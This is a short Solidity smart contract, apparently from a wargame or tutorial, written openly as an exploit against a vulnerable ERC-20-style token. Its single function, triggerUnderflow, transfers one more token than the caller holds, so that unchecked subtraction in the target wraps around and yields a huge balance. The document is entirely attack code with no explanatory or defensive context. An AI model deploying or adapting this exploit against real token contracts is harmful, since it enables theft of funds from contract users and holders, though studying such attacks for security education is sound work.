contract Exploit {
    Token public vulnerableToken;

    constructor(address _tokenAddress) {
        vulnerableToken = Token(_tokenAddress);
    }

    function triggerUnderflow() public {
        vulnerableToken.transfer(address(0), vulnerableToken.balanceOf(msg.sender) + 1);
    }
}